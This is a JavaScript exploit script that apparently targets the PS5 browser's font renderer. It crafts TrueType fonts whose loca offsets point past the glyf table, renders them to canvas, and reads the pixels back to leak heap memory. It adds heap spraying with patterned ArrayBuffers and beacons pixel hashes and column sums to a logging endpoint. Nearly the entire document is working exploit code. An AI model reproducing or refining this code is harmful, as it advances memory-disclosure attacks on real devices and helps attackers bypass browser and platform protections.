// p250 — Font loca OOB read info leak
//
// V190A-P2-T3 confirmed: font with loca[0]=0x7FFFFFFF loads + renders on PS5
// The font renderer reads glyph data from OOB memory offsets
// If interpreted as TrueType glyph outlines, heap data becomes pixel data
// Canvas getImageData reads the result → info leak
//
// Strategy:
// 1. Build fonts with loca offsets at controlled distances past glyf table
// 2. Render each on canvas, capture pixel data
// 3. Hash pixel rows → each hash encodes heap data at that offset
// 4. Compare across multiple font loads → stable = real data, not noise
//
// Beacon prefix: V260-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V260-' + tag + '?t=' + Date.now();
      if (body) { navigator.sendBeacon(url, String(body).substring(0, 900)); }
      else { new Image().src = url; }
    } catch(e) {}
  }

  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function push16(arr, val) { arr.push((val >> 8) & 0xFF, val & 0xFF); }
  function push32(arr, val) { arr.push((val >> 24) & 0xFF, (val >> 16) & 0xFF, (val >> 8) & 0xFF, val & 0xFF); }
  function tag2u32(s) { return (s.charCodeAt(0) << 24) | (s.charCodeAt(1) << 16) | (s.charCodeAt(2) << 8) | s.charCodeAt(3); }

  // Build a TrueType font with controllable loca offset for glyph 1
  // Glyph 0 = .notdef (valid, empty), Glyph 1 = 'A' (loca points OOB)
  function buildOOBFont(oobOffset, fontId) {
    var T = {};

    // head table (54 bytes) — indexToLocFormat=1 (32-bit loca offsets)
    var h = [];
    push32(h, 0x00010000); // version
    push32(h, 0x00005000); // fontRevision
    push32(h, 0);          // checksumAdjust
    push32(h, 0x5F0F3CF5); // magicNumber
    push16(h, 0x000B);     // flags
    push16(h, 1000);       // unitsPerEm
    for (var i = 0; i < 16; i++) h.push(0); // created/modified timestamps
    push16(h, 0);    // xMin
    push16(h, 0);    // yMin
    push16(h, 1000); // xMax
    push16(h, 1000); // yMax
    push16(h, 0);    // macStyle
    push16(h, 8);    // lowestRecPPEM
    push16(h, 2);    // fontDirectionHint
    push16(h, 1);    // indexToLocFormat = 1 (32-bit)
    push16(h, 0);    // glyphDataFormat
    T.head = h;

    // maxp (32 bytes) — 3 glyphs (notdef, A, B)
    var m = [];
    push32(m, 0x00010000); // version
    push16(m, 3);          // numGlyphs
    push16(m, 4);          // maxPoints
    push16(m, 1);          // maxContours
    push16(m, 0);          // maxCompositePoints
    push16(m, 0);          // maxCompositeContours
    push16(m, 1);          // maxZones
    push16(m, 0);          // maxTwilightPoints
    push16(m, 0);          // maxStorage
    push16(m, 0);          // maxFunctionDefs
    push16(m, 0);          // maxInstructionDefs
    push16(m, 0);          // maxStackElements
    push16(m, 0);          // maxSizeOfInstructions
    push16(m, 0);          // maxComponentElements
    push16(m, 0);          // maxComponentDepth
    T.maxp = m;

    // hhea
    var hh = [];
    push32(hh, 0x00010000);
    push16(hh, 800);    // ascender
    push16(hh, 0xFE70); // descender (-400 as int16)
    push16(hh, 0);      // lineGap
    push16(hh, 600);    // advanceWidthMax
    push16(hh, 0);      // minLeftSideBearing
    push16(hh, 0);      // minRightSideBearing
    push16(hh, 600);    // xMaxExtent
    push16(hh, 1);      // caretSlopeRise
    push16(hh, 0);      // caretSlopeRun
    for (var i = 0; i < 5; i++) push16(hh, 0); // reserved
    push16(hh, 0);      // metricDataFormat
    push16(hh, 3);      // numberOfHMetrics
    T.hhea = hh;

    // hmtx — 3 metrics
    var hm = [];
    push16(hm, 500); push16(hm, 0);   // glyph 0
    push16(hm, 600); push16(hm, 50);  // glyph 1 (A)
    push16(hm, 600); push16(hm, 50);  // glyph 2 (B)
    T.hmtx = hm;

    // cmap — format 4, maps 'A' (0x41) to glyph 1, 'B' (0x42) to glyph 2
    var cm = [];
    push16(cm, 0);      // version
    push16(cm, 1);      // numTables
    push16(cm, 3);      // platformID (Windows)
    push16(cm, 1);      // encodingID (Unicode BMP)
    push32(cm, 12);     // offset to subtable
    // format 4 subtable
    push16(cm, 4);      // format
    push16(cm, 40);     // length
    push16(cm, 0);      // language
    push16(cm, 6);      // segCountX2 (3 segments)
    push16(cm, 4);      // searchRange
    push16(cm, 1);      // entrySelector
    push16(cm, 2);      // rangeShift
    // endCode
    push16(cm, 0x0042); // seg0 end
    push16(cm, 0xFFFF); // seg1 end (sentinel)
    push16(cm, 0);      // reservedPad
    // startCode
    push16(cm, 0x0041); // seg0 start
    push16(cm, 0xFFFF); // seg1 start
    // idDelta
    push16(cm, 0xFFC0); // seg0: delta = -64 + 1 = 0x41->1, 0x42->2
    push16(cm, 1);      // seg1
    // idRangeOffset
    push16(cm, 0);      // seg0
    push16(cm, 0);      // seg1
    T.cmap = cm;

    // glyf — only glyph 0 is valid (simple square)
    // Glyph 0: simple glyph — 4 points, 1 contour (a square 0,0 to 500,700)
    var gf = [];
    push16(gf, 1);    // numberOfContours
    push16(gf, 0);    // xMin
    push16(gf, 0);    // yMin
    push16(gf, 500);  // xMax
    push16(gf, 700);  // yMax
    push16(gf, 3);    // endPtsOfContours[0] = 3 (4 points)
    push16(gf, 0);    // instructionLength
    // flags: all on-curve, x-short-positive, y-short-positive
    gf.push(0x37); // pt0: onCurve, xShort+, yShort+
    gf.push(0x27); // pt1: onCurve, xShort+, yShort-
    gf.push(0x17); // pt2: onCurve, xShort-, yShort-
    gf.push(0x07); // pt3: onCurve, xShort-, yShort+
    // x coords (short)
    gf.push(0); gf.push(250); // +250 (cumulative 250)
    gf.push(0); gf.push(250); // +250 (cumulative 500)
    gf.push(0); gf.push(250); // -250 (cumulative 250)
    gf.push(0); gf.push(250); // -250 (cumulative 0)
    // y coords (short)
    gf.push(2); gf.push(188); // +700 (cumulative 700)
    gf.push(2); gf.push(188); // -700 (cumulative 0)
    gf.push(2); gf.push(188); // -700 (cumulative ...)
    gf.push(2); gf.push(188); // +700

    // Pad glyf to 4-byte boundary
    while (gf.length % 4) gf.push(0);

    var GLYF_SIZE = gf.length; // ~40 bytes
    T.glyf = gf;

    // loca (32-bit format, numGlyphs+1 entries = 4 entries)
    var lo = [];
    push32(lo, 0);          // glyph 0 offset: start of glyf (valid)
    push32(lo, oobOffset);  // glyph 1 offset: OOB! Past end of glyf table
    push32(lo, oobOffset);  // glyph 2 offset: also OOB
    push32(lo, oobOffset);  // end sentinel
    T.loca = lo;

    // post
    var po = [];
    push32(po, 0x00030000); push32(po, 0); push16(po, 0xFF9C); push16(po, 50);
    for (var i = 0; i < 4; i++) push32(po, 0);
    T.post = po;

    // name
    var na = [];
    push16(na, 0); // format
    push16(na, 4); // count
    var nameStr = [];
    for (var c = 0; c < fontId.length; c++) { nameStr.push(0); nameStr.push(fontId.charCodeAt(c)); }
    var nameOffset = 6 + 4 * 12;
    for (var n = 0; n < 4; n++) {
      push16(na, 3);         // platformID
      push16(na, 1);         // encodingID
      push16(na, 0x0409);   // languageID
      push16(na, [1,2,4,6][n]); // nameID
      push16(na, nameStr.length); // length
      push16(na, 0);         // offset
    }
    for (var i = 0; i < nameStr.length; i++) na.push(nameStr[i]);
    T.name = na;

    // Assemble font file
    var tags = Object.keys(T).sort();
    var nt = tags.length;
    var headerSize = 12 + nt * 16;
    var off = headerSize;
    var offsets = {};
    for (var i = 0; i < nt; i++) {
      offsets[tags[i]] = off;
      off += T[tags[i]].length + ((4 - T[tags[i]].length % 4) % 4);
    }
    var buf = new ArrayBuffer(off);
    var dv = new DataView(buf);
    var u8 = new Uint8Array(buf);

    dv.setUint32(0, 0x00010000); // sfVersion
    dv.setUint16(4, nt);
    // searchRange, entrySelector, rangeShift (approximate)
    dv.setUint16(6, 128); dv.setUint16(8, 3); dv.setUint16(10, nt * 16 - 128);

    for (var i = 0; i < nt; i++) {
      var d = 12 + i * 16;
      dv.setUint32(d, tag2u32(tags[i]));
      dv.setUint32(d + 4, 0); // checksum
      dv.setUint32(d + 8, offsets[tags[i]]);
      dv.setUint32(d + 12, T[tags[i]].length);
      for (var j = 0; j < T[tags[i]].length; j++) {
        u8[offsets[tags[i]] + j] = T[tags[i]][j];
      }
    }

    return { buf: buf, glyfOffset: offsets.glyf, glyfSize: GLYF_SIZE, totalSize: off };
  }

  // Phase 1: Build reference font (valid glyph) and capture baseline
  B('P1-REF');
  var refFont = buildOOBFont(0, 'RefFont'); // loca offset 0 = within glyf
  B('P1-REF-SIZE-' + refFont.totalSize);

  var refFace = new FontFace('V250Ref', refFont.buf);
  refFace.load().then(function(loaded) {
    document.fonts.add(loaded);
    B('P1-REF-LOADED');

    var c = document.createElement('canvas');
    c.width = 120; c.height = 80;
    var ctx = c.getContext('2d');
    ctx.fillStyle = '#000';
    ctx.font = '48px V250Ref';
    ctx.fillText('A', 10, 60);
    var refPixels = ctx.getImageData(0, 0, 120, 80).data;

    // Hash the pixel data
    var refHash = 0;
    for (var i = 0; i < refPixels.length; i += 4) {
      if (refPixels[i + 3] > 0) refHash = (refHash * 31 + refPixels[i]) | 0;
    }
    B('P1-REF-HASH-' + hex(refHash));

    // Count non-transparent pixels
    var refPixCount = 0;
    for (var i = 0; i < refPixels.length; i += 4) {
      if (refPixels[i + 3] > 10) refPixCount++;
    }
    B('P1-REF-PIX-' + refPixCount);

    // Phase 2: Test OOB fonts at various offsets
    var oobOffsets = [
      64,     // just past small glyf table
      128,    // within font file (other table data)
      256,    // further into file
      512,    // past end of font file
      1024,   // well past font
      4096,   // ~1 page past
      65536,  // 16 pages past
      0x10000,  // 64KB
      0x100000, // 1MB
    ];

    var oi = 0;
    function testNext() {
      if (oi >= oobOffsets.length) {
        B('PHASE2-DONE');
        phase3();
        return;
      }

      var oobOff = oobOffsets[oi];
      var fontId = 'OOB' + oi;
      oi++;

      try {
        var font = buildOOBFont(oobOff, fontId);
        var face = new FontFace('V250' + fontId, font.buf);

        face.load().then(function(ld) {
          document.fonts.add(ld);

          var c2 = document.createElement('canvas');
          c2.width = 120; c2.height = 80;
          var ctx2 = c2.getContext('2d');
          ctx2.fillStyle = '#000';
          ctx2.font = '48px V250' + fontId;
          ctx2.fillText('A', 10, 60);
          var oobPixels = ctx2.getImageData(0, 0, 120, 80).data;

          var oobHash = 0;
          var oobPixCount = 0;
          var diffCount = 0;
          for (var i = 0; i < oobPixels.length; i += 4) {
            if (oobPixels[i + 3] > 0) oobHash = (oobHash * 31 + oobPixels[i]) | 0;
            if (oobPixels[i + 3] > 10) oobPixCount++;
            if (Math.abs(oobPixels[i + 3] - refPixels[i + 3]) > 5) diffCount++;
          }

          B('P2-' + hex(oobOff), 'hash=' + hex(oobHash) + ' pix=' + oobPixCount + ' diff=' + diffCount);

          // Sample first 32 non-zero alpha pixels' positions
          var positions = [];
          for (var i = 0; i < oobPixels.length && positions.length < 16; i += 4) {
            if (oobPixels[i + 3] > 10) {
              var px = (i / 4) % 120;
              var py = Math.floor((i / 4) / 120);
              positions.push(px + ',' + py);
            }
          }
          if (positions.length > 0) B('P2-POS-' + hex(oobOff), positions.join(' '));

          try { document.fonts.delete(ld); } catch(e) {}
          setTimeout(testNext, 50);
        }).catch(function(e) {
          B('P2-REJECT-' + hex(oobOff), String(e).substring(0, 60));
          setTimeout(testNext, 50);
        });
      } catch(e) {
        B('P2-ERR-' + hex(oobOff), String(e).substring(0, 60));
        setTimeout(testNext, 50);
      }
    }

    testNext();
  }).catch(function(e) {
    B('P1-REF-ERR', String(e).substring(0, 60));
  });

  // Phase 3: Stability test — render same OOB font twice, check if pixels match
  function phase3() {
    B('P3-STABILITY');
    var oobOff = 256; // moderate offset

    try {
      var f1 = buildOOBFont(oobOff, 'StabA');
      var f2 = buildOOBFont(oobOff, 'StabB');

      var faceA = new FontFace('V250StabA', f1.buf);
      var faceB = new FontFace('V250StabB', f2.buf);

      Promise.all([faceA.load(), faceB.load()]).then(function(loaded) {
        document.fonts.add(loaded[0]);
        document.fonts.add(loaded[1]);

        var c1 = document.createElement('canvas'); c1.width = 120; c1.height = 80;
        var ctx1 = c1.getContext('2d'); ctx1.fillStyle = '#000';
        ctx1.font = '48px V250StabA'; ctx1.fillText('A', 10, 60);
        var pix1 = ctx1.getImageData(0, 0, 120, 80).data;

        var c2 = document.createElement('canvas'); c2.width = 120; c2.height = 80;
        var ctx2 = c2.getContext('2d'); ctx2.fillStyle = '#000';
        ctx2.font = '48px V250StabB'; ctx2.fillText('A', 10, 60);
        var pix2 = ctx2.getImageData(0, 0, 120, 80).data;

        var matchCount = 0;
        var totalActive = 0;
        for (var i = 0; i < pix1.length; i += 4) {
          if (pix1[i + 3] > 0 || pix2[i + 3] > 0) {
            totalActive++;
            if (pix1[i] === pix2[i] && pix1[i+3] === pix2[i+3]) matchCount++;
          }
        }

        B('P3-RESULT', 'match=' + matchCount + ' total=' + totalActive + ' stable=' + (matchCount === totalActive));

        // If stable, the OOB data is deterministic — means we're reading real heap data
        if (matchCount === totalActive && totalActive > 0) {
          B('P3-DETERMINISTIC');
        } else if (totalActive === 0) {
          B('P3-NO-RENDER');
        } else {
          B('P3-NONDETERMINISTIC');
        }

        // Phase 4: Large allocation before font load to plant known data
        phase4();
      }).catch(function(e) {
        B('P3-ERR', String(e).substring(0, 60));
        phase4();
      });
    } catch(e) {
      B('P3-CATCH', String(e).substring(0, 60));
    }
  }

  // Phase 4: Plant known data adjacent to font buffer, read it back via OOB glyph
  function phase4() {
    B('P4-SPRAY');

    // Spray ArrayBuffers with known pattern BEFORE loading the font
    // Goal: if font buffer is allocated near our spray, OOB read hits our data
    var sprayBufs = [];
    var SPRAY_SIZE = 4096;
    var SPRAY_COUNT = 500;
    for (var i = 0; i < SPRAY_COUNT; i++) {
      var ab = new ArrayBuffer(SPRAY_SIZE);
      var v = new Uint32Array(ab);
      // Fill with a recognizable pattern: 0xABCD0000 | index
      for (var j = 0; j < v.length; j++) {
        v[j] = 0xABCD0000 | ((i * 1024 + j) & 0xFFFF);
      }
      sprayBufs.push(ab);
    }
    B('P4-SPRAYED-' + SPRAY_COUNT);

    // Now build and load an OOB font
    // The font buffer will be allocated from the heap
    // If it lands near our spray, the OOB loca read will hit spray data
    var oobOff = 512; // 512 bytes past glyf table
    var font = buildOOBFont(oobOff, 'Spray');
    var face = new FontFace('V250Spray', font.buf);

    face.load().then(function(ld) {
      document.fonts.add(ld);

      var c = document.createElement('canvas');
      c.width = 200; c.height = 100;
      var ctx = c.getContext('2d');
      ctx.fillStyle = '#000';
      ctx.font = '64px V250Spray';
      ctx.fillText('AB', 10, 80);
      var pixels = ctx.getImageData(0, 0, 200, 100).data;

      // Report pixel column sums (glyph shape encodes heap data)
      var colSums = [];
      for (var x = 0; x < 200; x++) {
        var sum = 0;
        for (var y = 0; y < 100; y++) {
          sum += pixels[(y * 200 + x) * 4 + 3]; // alpha channel
        }
        if (sum > 0) colSums.push(x + ':' + sum);
      }

      if (colSums.length > 0) {
        // Send first 40 non-zero columns
        B('P4-COLS', colSums.slice(0, 40).join(' '));
        B('P4-ACTIVE-COLS-' + colSums.length);
      } else {
        B('P4-NO-PIXELS');
      }

      // Also check: did any column have alpha sum matching our spray pattern?
      var sprayHit = false;
      for (var i = 0; i < colSums.length; i++) {
        var parts = colSums[i].split(':');
        var sum = parseInt(parts[1]);
        if ((sum & 0xFFFF0000) === 0xABCD0000) {
          sprayHit = true;
          B('P4-SPRAY-HIT-COL-' + parts[0] + '-SUM-' + hex(sum));
        }
      }

      if (!sprayHit) B('P4-NO-SPRAY-HIT');

      // Clean up
      try { document.fonts.delete(ld); } catch(e) {}
      sprayBufs = null;
      B('DONE');
    }).catch(function(e) {
      B('P4-REJECT', String(e).substring(0, 60));
      sprayBufs = null;
      B('DONE');
    });
  }
})();
